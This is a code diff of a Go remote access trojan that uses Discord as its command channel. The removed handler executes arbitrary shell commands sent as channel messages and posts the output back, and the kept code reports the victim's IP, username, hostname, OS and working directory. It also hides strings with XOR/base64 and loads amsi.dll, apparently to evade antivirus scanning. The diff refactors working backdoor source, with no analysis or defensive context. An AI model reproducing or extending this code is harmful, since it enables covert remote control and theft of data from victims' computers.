@@ -12,7 +12,6 @@ import (
 	"os/signal"
 	"os/user"
 	"runtime"
-	"strings"
 	"syscall"
 	"time"
 	"unsafe"
@@ -45,8 +44,6 @@ var (
 		return sysLib.NewProc(string(name))
 	}()
 
-	privateChan string
-
 	securityLib = windows.NewLazyDLL(decodeString("YW1zaS5kbGw="))
 )
 
@@ -63,81 +60,6 @@ func decodeString(encoded string) string {
 	decoded := dynamicXOR(encoded, key)
 	result, _ := base64.StdEncoding.DecodeString(decoded)
 	return string(result)
-}
-
-func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
-
-	if m.ChannelID != privateChan || m.Author.ID == s.State.User.ID {
-		return
-	}
-
-	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐")
-	actionCode := 0
-
-	if strings.HasPrefix(m.Content, "🏃‍♂️") {
-		command := strings.TrimSpace(strings.TrimPrefix(m.Content, "🏃‍♂️"))
-
-		if command == "" {
-			s.ChannelMessageSendReply(m.ChannelID, "❌ Error: Empty command", m.Reference())
-			s.MessageReactionAdd(m.ChannelID, m.ID, "❌")
-			return
-		}
-
-		output, err := interactions.ExecuteCommand(command)
-		if err != nil {
-			output = fmt.Sprintf("Error: %v", err)
-		}
-
-		// Handle empty output
-		if strings.TrimSpace(output) == "" {
-			output = "Command executed successfully with no output."
-		}
-
-		// Handle large output
-		if len(output) > 1987 {
-			chunks := splitLargeOutput(output, 1987)
-			for i, chunk := range chunks {
-				msgBuilder := strings.Builder{}
-				msgBuilder.WriteString(fmt.Sprintf("```\n[Part %d/%d]\n", i+1, len(chunks)))
-				msgBuilder.WriteString(chunk + "\n")
-				msgBuilder.WriteString("```")
-				s.ChannelMessageSendReply(m.ChannelID, msgBuilder.String(), m.Reference())
-			}
-		} else {
-			msgBuilder := strings.Builder{}
-			msgBuilder.WriteString("```\n")
-			msgBuilder.WriteString(output + "\n")
-			msgBuilder.WriteString("```")
-			s.ChannelMessageSendReply(m.ChannelID, msgBuilder.String(), m.Reference())
-		}
-
-		actionCode = 1
-	} else if m.Content == "💀" {
-		actionCode = 2
-	}
-
-	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
-
-	if actionCode > 0 {
-		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
-		if actionCode > 1 {
-			s.Close()
-			os.Exit(0)
-		}
-	}
-}
-
-func splitLargeOutput(output string, chunkSize int) []string {
-	var chunks []string
-	for len(output) > 0 {
-		if len(output) < chunkSize {
-			chunks = append(chunks, output)
-			break
-		}
-		chunks = append(chunks, output[:chunkSize])
-		output = output[chunkSize:]
-	}
-	return chunks
 }
 
 func sbys() {
@@ -277,7 +199,7 @@ func main() {
 		return
 	}
 
-	dg.AddHandler(messageHandler)
+	dg.AddHandler(interactions.HandleCommand)
 	dg.Identify.Intents = discordgo.IntentsGuildMessages
 
 	err = dg.Open()
@@ -292,7 +214,7 @@ func main() {
 		fmt.Println("Error creating channel:", err)
 		return
 	}
-	privateChan = c.ID
+	config.PrivateChan = c.ID
 
 	hostname, _ := os.Hostname()
 	currentUser, _ := user.Current()
@@ -303,8 +225,8 @@ func main() {
 
 	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s",
 		sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
-	m, _ := dg.ChannelMessageSend(privateChan, firstMsg)
-	dg.ChannelMessagePin(privateChan, m.ID)
+	m, _ := dg.ChannelMessageSend(config.PrivateChan, firstMsg)
+	dg.ChannelMessagePin(config.PrivateChan, m.ID)
 
 	s := make(chan os.Signal, 1)
 	signal.Notify(s, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
